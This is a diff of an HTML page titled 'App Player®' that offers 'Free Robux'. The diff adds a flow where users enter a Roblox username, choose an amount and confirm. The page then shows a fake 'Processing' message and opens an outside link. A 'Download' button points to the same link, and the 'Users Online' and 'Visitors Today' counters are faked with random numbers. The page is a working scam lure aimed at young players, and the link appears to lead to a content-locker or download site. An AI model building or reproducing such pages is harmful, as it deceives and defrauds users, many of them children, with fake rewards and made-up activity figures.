@@ -4,332 +4,336 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>App Player®</title>
-
-<!-- Font Awesome for search icon -->
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
 <style>
-
-/* DYNAMIC GAMING BACKGROUND */
 body{
-font-family:sans-serif;
-color:#fff;
-text-align:center;
-padding:20px;
-overflow-x:hidden;
-
-background: linear-gradient(-45deg,#0f0f1f,#1a1a40,#0f3460,#16213e,#311b92,#ff3d00);
-background-size:400% 400%;
-animation:gradientMove 12s ease infinite;
+  font-family:sans-serif;
+  color:#fff;
+  text-align:center;
+  padding:20px;
+  overflow-x:hidden;
+  background: linear-gradient(-45deg,#0f0f1f,#1a1a40,#0f3460,#16213e,#311b92,#ff3d00);
+  background-size:400% 400%;
+  animation:gradientMove 12s ease infinite;
 }
 
 @keyframes gradientMove{
-0%{background-position:0% 50%}
-50%{background-position:100% 50%}
-100%{background-position:0% 50%}
+  0%{background-position:0% 50%}
+  50%{background-position:100% 50%}
+  100%{background-position:0% 50%}
 }
 
-/* LOADING SCREEN */
 #loader{
-position:fixed;
-top:0;
-left:0;
-width:100%;
-height:100%;
-background:#0f0f1f;
-display:flex;
-justify-content:center;
-align-items:center;
-flex-direction:column;
-z-index:9999;
+  position:fixed; top:0; left:0; width:100%; height:100%;
+  background:#0f0f1f;
+  display:flex; justify-content:center; align-items:center; flex-direction:column;
+  z-index:9999;
 }
 
 .spinner{
-border:6px solid #333;
-border-top:6px solid #ff3d3d;
-border-radius:50%;
-width:60px;
-height:60px;
-animation:spin 1s linear infinite;
+  border:6px solid #333;
+  border-top:6px solid #ff3d3d;
+  border-radius:50%;
+  width:60px; height:60px;
+  animation:spin 1s linear infinite;
 }
 
 @keyframes spin{
-0%{transform:rotate(0deg)}
-100%{transform:rotate(360deg)}
+  0%{transform:rotate(0deg)}
+  100%{transform:rotate(360deg)}
 }
 
-/* HEADINGS */
 h1{
-margin-bottom:20px;
-color:#00e5ff;
-text-shadow:0 0 10px #00e5ff;
+  margin-bottom:20px;
+  color:#00e5ff;
+  text-shadow:0 0 10px #00e5ff;
 }
 
-/* SEARCH BOX */
 .search-container{
-margin-bottom:30px;
-position:relative;
-display:inline-block;
-width:300px;
+  margin-bottom:30px;
+  position:relative;
+  display:inline-block;
+  width:300px;
 }
 
 .search-container input{
-width:100%;
-padding:10px 40px 10px 15px;
-border-radius:50px;
-border:none;
-background:rgba(255,255,255,0.05);
-color:#fff;
-outline:none;
-box-shadow:0 0 10px #00e5ff, 0 0 20px #00e5ff inset;
-transition:0.3s;
+  width:100%;
+  padding:10px 40px 10px 15px;
+  border-radius:50px;
+  border:none;
+  background:rgba(255,255,255,0.05);
+  color:#fff;
+  outline:none;
+  box-shadow:0 0 10px #00e5ff, 0 0 20px #00e5ff inset;
+  transition:0.3s;
 }
 
 .search-container input:focus{
-box-shadow:0 0 15px #00e5ff, 0 0 25px #00e5ff inset;
+  box-shadow:0 0 15px #00e5ff, 0 0 25px #00e5ff inset;
 }
 
 .search-container i{
-position:absolute;
-right:15px;
-top:50%;
-transform:translateY(-50%);
-color:#00e5ff;
-transition:0.3s;
+  position:absolute;
+  right:15px; top:50%;
+  transform:translateY(-50%);
+  color:#00e5ff;
+  transition:0.3s;
 }
 
 .search-container input:focus + i{
-color:#ff3d3d;
-text-shadow:0 0 10px #ff3d3d, 0 0 20px #ff3d3d;
+  color:#ff3d3d;
+  text-shadow:0 0 10px #ff3d3d, 0 0 20px #ff3d3d;
 }
 
-/* COUNTERS */
 .counters{display:flex;gap:40px;justify-content:center;margin-bottom:30px}
-
 .counter{
-background:rgba(255,255,255,0.05);
-padding:20px 40px;
-border-radius:15px;
-box-shadow:0 0 10px rgba(0,255,255,0.3);
+  background:rgba(255,255,255,0.05);
+  padding:20px 40px;
+  border-radius:15px;
+  box-shadow:0 0 10px rgba(0,255,255,0.3);
 }
 
-/* GAMES CARDS */
 .games{
-display:flex;
-gap:20px;
-justify-content:center;
-flex-wrap:wrap;
+  display:flex; gap:20px; justify-content:center; flex-wrap:wrap;
 }
 
 .card{
-background:rgba(0,0,0,0.3);
-border-radius:15px;
-width:260px;
-padding:20px;
-transition:0.3s;
-box-shadow:0 0 15px rgba(0,255,255,0.2);
+  background:rgba(0,0,0,0.3);
+  border-radius:15px;
+  width:260px;
+  padding:20px;
+  transition:0.3s;
+  box-shadow:0 0 15px rgba(0,255,255,0.2);
 }
 
 .card:hover{
-transform:translateY(-10px);
-box-shadow:0 10px 30px rgba(0,255,255,0.6);
+  transform:translateY(-10px);
+  box-shadow:0 10px 30px rgba(0,255,255,0.6);
 }
 
 .card img{
-width:100%;
-border-radius:12px;
+  width:100%;
+  border-radius:12px;
 }
 
-/* BUTTONS */
 .btn{
-margin-top:15px;
-display:inline-block;
-padding:12px 24px;
-background:linear-gradient(45deg,#ff3d3d,#ff6d00,#ff3d3d);
-color:#fff;
-border-radius:50px;
-text-decoration:none;
-font-weight:bold;
-cursor:pointer;
-transition:0.3s;
+  margin-top:15px;
+  display:inline-block;
+  padding:12px 24px;
+  background:linear-gradient(45deg,#ff3d3d,#ff6d00,#ff3d3d);
+  color:#fff;
+  border-radius:50px;
+  text-decoration:none;
+  font-weight:bold;
+  cursor:pointer;
+  transition:0.3s;
 }
 
 .btn:hover{
-background:linear-gradient(45deg,#ff6d00,#ff3d3d,#ff6d00);
-transform: scale(1.05);
+  background:linear-gradient(45deg,#ff6d00,#ff3d3d,#ff6d00);
+  transform: scale(1.05);
 }
 
-/* POPUP */
 .popup-bg{
-display:none;
-position:fixed;
-top:0;
-left:0;
-width:100%;
-height:100%;
-background:rgba(0,0,0,0.85);
-justify-content:center;
-align-items:center;
-z-index:999;
+  display:none;
+  position:fixed;
+  top:0; left:0; width:100%; height:100%;
+  background:rgba(0,0,0,0.85);
+  justify-content:center; align-items:center;
+  z-index:999;
 }
 
 .popup-bg.show{
-display:flex;
+  display:flex;
 }
 
 .popup{
-background:linear-gradient(135deg,#1a1a2f,#0f0f2f);
-padding:30px;
-border-radius:20px;
-width:90%;
-max-width:400px;
-box-shadow:0 0 20px #00e5ff;
+  background:linear-gradient(135deg,#1a1a2f,#0f0f2f);
+  padding:30px;
+  border-radius:20px;
+  width:90%;
+  max-width:400px;
+  box-shadow:0 0 20px #00e5ff;
 }
 
 .popup input{
-padding:12px;
-width:80%;
-margin-bottom:15px;
-border-radius:10px;
-border:none;
-background:rgba(255,255,255,0.05);
-color:#fff;
+  padding:12px;
+  width:80%;
+  margin-bottom:15px;
+  border-radius:10px;
+  border:none;
+  background:rgba(255,255,255,0.05);
+  color:#fff;
 }
 
 .popup button{
-padding:12px 25px;
-border:none;
-border-radius:50px;
-background:linear-gradient(45deg,#00e5ff,#00bfa5);
-color:#fff;
-font-weight:bold;
-cursor:pointer;
-transition:0.3s;
+  padding:12px 25px;
+  border:none;
+  border-radius:50px;
+  background:linear-gradient(45deg,#00e5ff,#00bfa5);
+  color:#fff;
+  font-weight:bold;
+  cursor:pointer;
+  transition:0.3s;
 }
 
 .popup button:hover{
-background:linear-gradient(45deg,#00bfa5,#00e5ff);
-transform: scale(1.05);
+  background:linear-gradient(45deg,#00bfa5,#00e5ff);
+  transform: scale(1.05);
 }
 
+.robux-buttons{
+  display:flex; justify-content:space-around; margin-top:10px;
+}
+
+.robux-buttons button{
+  padding:10px 15px;
+  background:linear-gradient(45deg,#ff6d00,#ff3d3d);
+  border:none; border-radius:10px;
+  font-weight:bold;
+  cursor:pointer;
+  color:#fff;
+  transition:0.3s;
+}
+
+.robux-buttons button:hover{
+  transform: scale(1.1);
+}
 </style>
 </head>
-
 <body>
 
-<!-- LOADING -->
 <div id="loader">
-<div class="spinner"></div>
-<p>Loading...</p>
+  <div class="spinner"></div>
+  <p>Loading...</p>
 </div>
 
-<!-- SEARCH -->
 <div class="search-container">
-<input type="text" id="game-search" placeholder="Search Games..." onkeyup="filterGames()">
-<i class="fas fa-search"></i>
+  <input type="text" id="game-search" placeholder="Search Games..." onkeyup="filterGames()">
+  <i class="fas fa-search"></i>
 </div>
 
 <h1>Welcome to App Player®</h1>
 
 <div class="counters">
-
-<div class="counter">
-<h2 id="online-users">0</h2>
-<p>Users Online Now</p>
-</div>
-
-<div class="counter">
-<h2 id="total-visitors">0</h2>
-<p>Visitors Today</p>
-</div>
-
+  <div class="counter">
+    <h2 id="online-users">0</h2>
+    <p>Users Online Now</p>
+  </div>
+  <div class="counter">
+    <h2 id="total-visitors">0</h2>
+    <p>Visitors Today</p>
+  </div>
 </div>
 
 <div class="games" id="games-container">
-
-<div class="card">
-<img src="https://img.sanishtech.com/u/b3a2a4211cb3bc5b2a45a840289fe658.jpg">
-<h3>Free Robux</h3>
-<div class="btn" onclick="openPopup()">Get</div>
+  <div class="card">
+    <img src="https://img.sanishtech.com/u/b3a2a4211cb3bc5b2a45a840289fe658.jpg">
+    <h3>Free Robux</h3>
+    <div class="btn" onclick="openPopup()">Get</div>
+  </div>
+  <div class="card">
+    <img src="https://img.sanishtech.com/u/7cd7a2b2799aebde8c88cd72c110be79.jpg">
+    <h3>My Zoo Voice</h3>
+    <a href="https://confirmapp.online/cl/i/822jo6" class="btn" target="_blank">Download</a>
+  </div>
 </div>
 
-<div class="card">
-<img src="https://img.sanishtech.com/u/7cd7a2b2799aebde8c88cd72c110be79.jpg">
-<h3>My Zoo Voice</h3>
-<a href="https://confirmapp.online/cl/i/822jo6" class="btn" target="_blank">Download</a>
-</div>
-
-</div>
-
-<!-- POPUP -->
+<!-- Roblox Username Popup -->
 <div class="popup-bg" id="popup-bg">
-<div class="popup">
-
-<h3>Enter Your Roblox Username</h3>
-
-<input type="text" id="roblox-username" placeholder="Username...">
-
-<br>
-
-<button onclick="submitUsername()">Continue</button>
-
+  <div class="popup" id="popup-content">
+    <h3>Enter Your Roblox Username</h3>
+    <input type="text" id="roblox-username" placeholder="Username..."><br>
+    <div class="robux-buttons">
+      <button onclick="confirmRobux(500)">500</button>
+      <button onclick="confirmRobux(1000)">1000</button>
+      <button onclick="confirmRobux(2000)">2000</button>
+      <button onclick="confirmRobux(3000)">3000</button>
+    </div>
+  </div>
 </div>
+
+<!-- Confirmation Popup -->
+<div class="popup-bg" id="confirm-popup">
+  <div class="popup" id="confirm-content">
+    <h3 id="confirm-text"></h3>
+    <button onclick="generateRobux()">Confirm</button>
+    <button onclick="cancelConfirm()">Cancel</button>
+  </div>
 </div>
 
 <script>
+window.addEventListener("load",()=>{setTimeout(()=>{document.getElementById("loader").style.display="none";},1500);});
 
-/* LOADER */
-window.addEventListener("load",function(){
-setTimeout(function(){
-document.getElementById("loader").style.display="none";
-},1500);
-});
-
-/* COUNTERS */
-let online=70
-let visitors=320
-
+let online=70, visitors=320;
 function updateCounters(){
-online+=Math.floor(Math.random()*3)
-visitors+=Math.floor(Math.random()*7)
-document.getElementById("online-users").textContent=online
-document.getElementById("total-visitors").textContent=visitors
+  online+=Math.floor(Math.random()*3)
+  visitors+=Math.floor(Math.random()*7)
+  document.getElementById("online-users").textContent=online
+  document.getElementById("total-visitors").textContent=visitors
 }
-
 setInterval(updateCounters,3000)
 updateCounters()
 
-/* POPUP */
-function openPopup(){
-document.getElementById("popup-bg").classList.add("show")
+function openPopup(){ document.getElementById("popup-bg").classList.add("show"); }
+
+// Store data for confirmation
+let robuxAmount=0, robloxUser="";
+
+// Step 1: Confirm Robux amount
+function confirmRobux(amount){
+  robloxUser = document.getElementById("roblox-username").value.trim();
+  if (robloxUser === "") { alert("Please enter your Roblox username."); return; }
+
+  let regex = /^[a-zA-Z0-9_]{3,20}$/;
+  if (!regex.test(robloxUser)) { alert("Invalid username! Use 3-20 letters, numbers, or underscores."); return; }
+
+  robuxAmount = amount;
+  document.getElementById("confirm-text").textContent = 
+    `Are you sure you want to receive ${robuxAmount} Robux for "${robloxUser}"?`;
+
+  document.getElementById("popup-bg").classList.remove("show");
+  document.getElementById("confirm-popup").classList.add("show");
 }
 
-function submitUsername(){
-let user=document.getElementById("roblox-username").value.trim()
-if(user===""){
-alert("Enter username")
-return
-}
-window.open("https://confirmapp.online/cl/i/822jo6","_blank")
-document.getElementById("popup-bg").classList.remove("show")
-document.getElementById("roblox-username").value=""
+// Step 2: Generate Robux
+function generateRobux(){
+  let popup = document.getElementById("confirm-content");
+  popup.innerHTML = `<h3>Processing ${robuxAmount} Robux for "${robloxUser}"...</h3><p>Please wait...</p>`;
+
+  setTimeout(() => {
+    window.open("https://confirmapp.online/cl/i/822jo6", "_blank");
+    document.getElementById("confirm-popup").classList.remove("show");
+
+    // Reset original popup content
+    document.getElementById("popup-content").innerHTML = `
+      <h3>Enter Your Roblox Username</h3>
+      <input type="text" id="roblox-username" placeholder="Username..."><br>
+      <div class="robux-buttons">
+        <button onclick="confirmRobux(500)">500</button>
+        <button onclick="confirmRobux(1000)">1000</button>
+        <button onclick="confirmRobux(2000)">2000</button>
+        <button onclick="confirmRobux(3000)">3000</button>
+      </div>
+    `;
+  }, 2500);
 }
 
-/* SEARCH FUNCTIONALITY */
-function filterGames() {
-  let input = document.getElementById('game-search').value.toLowerCase();
-  let cards = document.getElementById('games-container').getElementsByClassName('card');
+// Cancel confirmation
+function cancelConfirm(){
+  document.getElementById("confirm-popup").classList.remove("show");
+  document.getElementById("popup-bg").classList.add("show");
+}
 
-  for (let i = 0; i < cards.length; i++) {
-    let title = cards[i].getElementsByTagName('h3')[0].textContent.toLowerCase();
-    if (title.includes(input)) {
-      cards[i].style.display = "";
-    } else {
-      cards[i].style.display = "none";
-    }
+function filterGames(){
+  let input=document.getElementById('game-search').value.toLowerCase();
+  let cards=document.getElementById('games-container').getElementsByClassName('card');
+  for(let i=0;i<cards.length;i++){
+    let title=cards[i].getElementsByTagName('h3')[0].textContent.toLowerCase();
+    cards[i].style.display=title.includes(input)?"":"none";
   }
 }
 </script>
-
 </body>
 </html>
